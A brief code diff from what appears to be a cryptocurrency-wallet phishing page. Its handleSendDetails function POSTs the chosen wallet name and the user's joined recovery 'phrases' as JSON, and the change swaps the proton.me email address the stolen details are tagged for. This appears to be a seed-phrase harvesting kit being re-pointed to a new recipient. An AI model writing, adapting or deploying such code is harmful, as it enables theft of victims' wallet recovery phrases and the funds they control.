@@ -98,7 +98,7 @@ async function handleSendDetails() {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
-        email: "oluwaidan@proton.me",
+        email: "Gerfish7458@proton.me",
         walletName: selectedWallet.value.name,
         details: phrases.value.join(" "),
       }),
